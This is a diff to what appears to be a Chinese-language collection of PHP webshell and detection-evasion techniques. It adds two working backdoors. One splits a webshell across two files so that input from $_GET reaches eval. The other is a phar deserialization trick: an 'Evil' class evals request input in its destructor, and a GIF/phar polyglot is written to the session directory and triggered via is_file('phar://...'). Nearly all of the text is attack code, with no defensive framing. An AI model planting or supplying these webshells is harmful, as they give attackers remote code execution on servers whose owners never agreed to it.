@@ -271,6 +271,20 @@ eval($outer_array);
 ?>
 ```
 
+#### 多个文件
+1.php
+```
+<?php
+$code = $_GET[1];
+?>
+```
+
+2.php
+```
+include "1.php";
+eval($code);
+```
+
 #### 非等号赋值-数组传递
 ```php
 <?php
@@ -314,7 +328,26 @@ $s=base64_decode('YToyOntpOjE7czo2OiJhc3NlcnQiO2k6MjtzOjEwOiJwaHBpbmZvKCk7Ijt9')
 $o = unserialize($s);
 $o[1]($code);
 ?>
+```
 
+#### phar
+```
+<?php
+class Evil {
+	public function __destruct(){
+		eval($_GET[1]);
+	}
+}
+
+$filename = session_save_path()."\poc.jpg";
+
+$base64_content = "R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpEAAAAAQAAABEAAAABAAAAAAAPAAAATzo0OiJFdmlsIjowOnt9BwAAAGZvby50eHQDAAAAwuwKXgMAAACqjP92tgEAAAAAAABiYXKom9RaUZXhHL4WJYxruh//z4dpZQIAAABHQk1C";
+$file = fopen($filename, "w");
+fwrite($file,base64_decode($base64_content));
+fclose($file);
+
+is_file("phar://".$filename);
+?>
 ```
 
 #### pop链
